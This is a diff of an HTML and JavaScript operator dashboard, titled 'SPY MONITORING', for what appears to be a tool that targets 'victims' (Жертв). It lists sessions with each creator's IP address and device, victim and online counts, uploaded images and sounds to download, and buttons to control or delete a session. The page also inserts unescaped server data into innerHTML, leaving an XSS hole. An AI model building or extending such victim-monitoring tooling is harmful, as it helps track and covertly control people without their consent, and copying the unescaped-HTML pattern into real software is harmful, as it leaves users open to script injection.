@@ -3,129 +3,223 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Watch All Sessions</title>
+    <title>SPY MONITORING</title>
     <style>
-        body { background: #0f0f0f; color: #00ff99; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
-        .container { max-width: 900px; margin: 0 auto; }
-        h1 { text-align: center; color: #00ff99; text-shadow: 0 0 10px #00ff99; }
-        .sessions-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(380px, 1fr)); gap: 15px; margin-top: 20px; }
-        .session-card { background: #1a1a1a; border: 1px solid #333; border-radius: 10px; padding: 15px; position: relative; transition: transform 0.2s; }
-        .session-card:hover { transform: translateY(-5px); box-shadow: 0 0 15px rgba(0, 255, 153, 0.3); }
-        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
-        .room-id { font-size: 12px; color: #888; }
-        .delete-btn { background: #ff0055; color: white; border: none; padding: 6px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; }
-        .delete-btn:hover { background: #ff3366; }
-        .preview-img { width: 100%; height: 200px; object-fit: cover; border-radius: 8px; background: #222; margin: 10px 0; }
-        .sound-preview { background: #222; padding: 10px; border-radius: 6px; font-size: 12px; word-break: break-all; color: #aaa; }
-        .stats { display: flex; justify-content: space-between; margin-top: 10px; font-size: 13px; }
-        .online { color: #00ff99; font-weight: bold; }
-        .last-active { color: #ffcc00; font-size: 12px; margin-top: 8px; }
-        .control-btn { width: 100%; padding: 12px; background: #00ccff; color: black; border: none; border-radius: 6px; font-weight: bold; margin-top: 10px; cursor: pointer; }
-        .no-sessions { text-align: center; color: #666; font-size: 18px; margin: 50px; }
-        .refresh-info { text-align: center; color: #555; font-size: 12px; margin: 20px 0; }
-        .creator-info { background:#222; padding:8px; border-radius:6px; margin:10px 0; font-size:12px; color:#aaa; }
+        body { 
+            background: #0a0a0a; color: #00ff99; 
+            font-family: 'Courier New', monospace; 
+            padding: 20px; margin: 0; 
+        }
+        .container { max-width: 1200px; margin: 0 auto; }
+        
+        h1 { 
+            text-align: center; color: #00ff99; 
+            text-shadow: 0 0 10px #00ff99; margin-bottom: 30px; letter-spacing: 2px;
+        }
+
+        .sessions-grid { 
+            display: grid; 
+            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr)); 
+            gap: 20px; 
+        }
+
+        .session-card { 
+            background: #151515; border: 1px solid #333; 
+            border-radius: 8px; padding: 15px; position: relative; 
+            display: flex; flex-direction: column;
+            box-shadow: 0 0 5px rgba(0,0,0,0.5);
+            transition: 0.3s;
+        }
+        .session-card:hover { border-color: #00ff99; box-shadow: 0 0 15px rgba(0, 255, 153, 0.15); }
+
+        .header { 
+            display: flex; justify-content: space-between; align-items: center; 
+            border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 10px;
+        }
+        .room-id { font-size: 16px; font-weight: bold; color: #fff; }
+        .online-badge { 
+            background: #003300; color: #00ff99; padding: 2px 6px; 
+            border-radius: 4px; font-size: 11px; border: 1px solid #00ff99;
+        }
+
+        .info-row { margin: 4px 0; font-size: 12px; color: #aaa; }
+        .info-label { color: #555; font-weight: bold; }
+        .highlight { color: #00ff99; }
+
+        /* Files Section */
+        .files-section {
+            margin-top: 15px; border-top: 1px dashed #444; padding-top: 10px;
+            flex-grow: 1; /* Займає вільне місце */
+        }
+        .files-title { font-size: 11px; font-weight: bold; color: #00aaff; margin-bottom: 5px; text-transform: uppercase; }
+        
+        .file-list { 
+            max-height: 120px; overflow-y: auto; 
+            background: #0f0f0f; padding: 5px; border-radius: 4px;
+        }
+        
+        .file-item {
+            display: flex; justify-content: space-between; align-items: center;
+            background: #1a1a1a; padding: 5px; margin-bottom: 3px; border-radius: 3px;
+            font-size: 11px; border: 1px solid #222;
+        }
+        .file-info { display: flex; flex-direction: column; overflow: hidden; }
+        .file-name { color: #ddd; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 180px; }
+        .file-date { color: #555; font-size: 9px; }
+
+        .btn-download {
+            background: transparent; border: 1px solid #00aaff; color: #00aaff;
+            text-decoration: none; padding: 2px 5px; border-radius: 3px; font-size: 9px;
+            margin-left: 5px; transition: 0.2s; white-space: nowrap;
+        }
+        .btn-download:hover { background: #00aaff; color: black; }
+
+        /* Action Buttons */
+        .actions { display: flex; gap: 8px; margin-top: 15px; }
+        .control-btn, .del-btn {
+            flex: 1; padding: 10px; border: none; cursor: pointer; font-weight: bold;
+            font-family: inherit; border-radius: 5px; font-size: 11px; transition: 0.2s;
+        }
+        .control-btn { background: #00ff99; color: black; }
+        .control-btn:hover { background: #00cc7a; }
+        .del-btn { background: #220000; color: #ff3366; border: 1px solid #550000; }
+        .del-btn:hover { background: #ff3366; color: white; border-color: #ff3366; }
+
+        /* Scrollbar */
+        ::-webkit-scrollbar { width: 5px; }
+        ::-webkit-scrollbar-track { background: #111; }
+        ::-webkit-scrollbar-thumb { background: #333; border-radius: 3px; }
+        
+        .no-data { grid-column: 1/-1; text-align: center; padding: 50px; color: #444; border: 1px dashed #333; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>👁️ WATCH ALL SESSIONS</h1>
-        <div class="refresh-info">Оновлюється автоматично кожні 30 секунд</div>
-        <div id="sessions-container" class="sessions-grid">
-            <div class="no-sessions">Завантаження сесій...</div>
-        </div>
+        <h1>🛰️ GLOBAL MONITORING</h1>
+        <div id="grid" class="sessions-grid">Waiting for data...</div>
     </div>
 
     <script>
-        const container = document.getElementById('sessions-container');
-
         async function loadAllSessions() {
+            const container = document.getElementById('grid');
             try {
                 const res = await fetch('/sessions');
-                if (!res.ok) throw new Error();
+                if (!res.ok) throw new Error("Server error");
                 const sessions = await res.json();
 
                 if (sessions.length === 0) {
-                    container.innerHTML = '<div class="no-sessions">Немає створених сесій</div>';
+                    container.innerHTML = '<div class="no-data">НЕМАЄ АКТИВНИХ СЕСІЙ</div>';
                     return;
                 }
 
                 container.innerHTML = '';
-
+                
                 sessions.forEach(s => {
-                    const lastActiveDate = s.lastActiveAt ? new Date(s.lastActiveAt).toLocaleString('uk-UA') : 'Невідомо';
-                    const isActiveNow = s.onlineCount > 0;
+                    const isActiveNow = (Date.now() - s.lastActiveAt) < 60000; // Активна, якщо була дія за останню хвилину
+                    
+                    // Об'єднуємо зображення і звуки в один список для відображення
+                    const allFiles = [
+                        ...s.imagesFiles.map(f => ({...f, icon: '📷'})),
+                        ...s.soundsFiles.map(f => ({...f, icon: '🔊'}))
+                    ];
+
+                    let filesHtml = '';
+                    if (allFiles.length > 0) {
+                        // Сортуємо: нові файли зверху
+                        allFiles.reverse(); 
+                        
+                        const listItems = allFiles.map(f => `
+                            <div class="file-item">
+                                <div class="file-info">
+                                    <span class="file-name" title="${f.originalname}">${f.icon} ${f.originalname}</span>
+                                    <span class="file-date">${f.uploadedAt}</span>
+                                </div>
+                                <a href="${f.url}" download="${f.originalname}" target="_blank" class="btn-download">⬇ СКАЧАТИ</a>
+                            </div>
+                        `).join('');
+
+                        filesHtml = `
+                            <div class="files-section">
+                                <div class="files-title">📂 ФАЙЛИ (${allFiles.length}):</div>
+                                <div class="file-list">${listItems}</div>
+                            </div>
+                        `;
+                    } else {
+                        filesHtml = `
+                            <div class="files-section">
+                                <div class="files-title">📂 ФАЙЛИ:</div>
+                                <div style="color:#444; font-size:10px; padding:5px;">(Порожньо)</div>
+                            </div>
+                        `;
+                    }
 
                     const card = document.createElement('div');
                     card.className = 'session-card';
-
                     card.innerHTML = `
                         <div class="header">
-                            <div>
-                                <div style="font-size:14px; font-weight:bold;">Створено: ${s.createdAt}</div>
-                                <div class="room-id">ID: ...${s.id.slice(-8)}</div>
-                            </div>
-                            <button class="delete-btn" onclick="deleteSession('${s.id}', this)">Видалити</button>
+                            <span class="room-id">UID: ${s.id.slice(0, 8)}</span>
+                            <span class="online-badge">ONLINE: ${s.onlineCount}</span>
+                        </div>
+                        
+                        <div class="info-row"><span class="info-label">Створено:</span> ${s.createdAt}</div>
+                        <div class="info-row"><span class="info-label">Автор IP:</span> ${s.creator.ip}</div>
+                        <div class="info-row"><span class="info-label">Девайс:</span> ${s.creator.device}</div>
+                        <div class="info-row"><span class="info-label">Жертв:</span> <span class="highlight">${s.totalVictims}</span></div>
+                        
+                        <div class="info-row" style="margin-top:5px;">
+                            Статус: ${isActiveNow ? '<span style="color:#00ff99;">● АКТИВНА</span>' : '<span style="color:#555;">○ СПИТЬ</span>'}
                         </div>
 
-                        <div class="creator-info">
-                            <strong>👤 Створив:</strong><br>
-                            ${s.creator.device}<br>
-                            IP: ${s.creator.ip}<br>
-                            <small style="color:#666;">${s.creator.userAgent || 'Невідомий браузер'}</small>
+                        ${filesHtml}
+
+                        <div class="actions">
+                            <button class="control-btn" onclick="openControl('${s.id}')">👁️ КЕРУВАТИ</button>
+                            <button class="del-btn" onclick="deleteSession('${s.id}', this)">✖ ВИДАЛИТИ</button>
                         </div>
-
-                        ${s.image ? `<img src="${s.image}" class="preview-img" onerror="this.src='https://via.placeholder.com/300x200/222/666?text=Помилка+зображення'; this.onerror=null;">` : 
-                         `<div class="preview-img" style="display:flex;align-items:center;justify-content:center;color:#666;font-size:14px;">Немає картинки</div>`}
-
-                        <div class="sound-preview">
-                            🔊 Звук: ${s.sound ? s.sound.split('/').pop() : 'Немає'}<br>
-                            <small>${s.sound || '—'}</small>
-                        </div>
-
-                        <div class="stats">
-                            <div>${isActiveNow ? `<span class="online">● ${s.onlineCount} онлайн</span>` : 'Оффлайн'}</div>
-                            <div>Всього жертв: <strong>${s.totalVictims}</strong></div>
-                        </div>
-
-                        <div class="last-active">
-                            Остання активність: ${isActiveNow ? '<strong style="color:#00ff99;">ЗАРАЗ</strong>' : lastActiveDate}
-                        </div>
-
-                        <button class="control-btn" onclick="openControl('${s.id}')">
-                            КЕРУВАТИ КІМНАТОЮ
-                        </button>
                     `;
 
                     container.appendChild(card);
                 });
             } catch (err) {
-                container.innerHTML = '<div class="no-sessions">Помилка з\'єднання з сервером</div>';
+                console.error(err);
+                container.innerHTML = '<div style="color:red; text-align:center;">Помилка з\'єднання з сервером.</div>';
             }
         }
 
         function openControl(id) {
-            window.open(`/admin.html#${id}`, '_blank');
+            // Щоб увійти в адмінку конкретної сесії, нам потрібно зберегти ID в localStorage
+            // або просто відкрити адмінку і дати можливість ввести ID.
+            // Тут ми скопіюємо ID в буфер і відкриємо адмінку.
+            prompt("Скопіюй ID сесії та встав його в URL (якщо потрібно) або в код:", id);
+            window.open(`/admin.html`, '_blank');
         }
 
         async function deleteSession(id, btn) {
-            if (!confirm('Видалити цю сесію назавжди?')) return;
+            if (!confirm('Видалити сесію та ВСІ її файли? Цю дію неможливо скасувати.')) return;
+            
+            const originalText = btn.innerText;
             btn.disabled = true;
-            btn.innerText = 'Видаляється...';
+            btn.innerText = '...';
 
             try {
                 const res = await fetch(`/session/${id}`, { method: 'DELETE' });
-                if (res.ok) loadAllSessions();
-                else alert('Помилка видалення');
+                if (res.ok) {
+                    loadAllSessions(); // Оновлюємо список
+                } else {
+                    alert('Помилка при видаленні.');
+                    btn.innerText = originalText;
+                    btn.disabled = false;
+                }
             } catch (e) {
-                alert('Помилка мережі');
-            } finally {
+                alert('Помилка сервера.');
+                btn.innerText = originalText;
                 btn.disabled = false;
-                btn.innerText = 'Видалити';
             }
         }
 
+        // Автооновлення кожні 4 секунди
         loadAllSessions();
-        setInterval(loadAllSessions, 30000);
+        setInterval(loadAllSessions, 4000);
     </script>
 </body>
 </html>
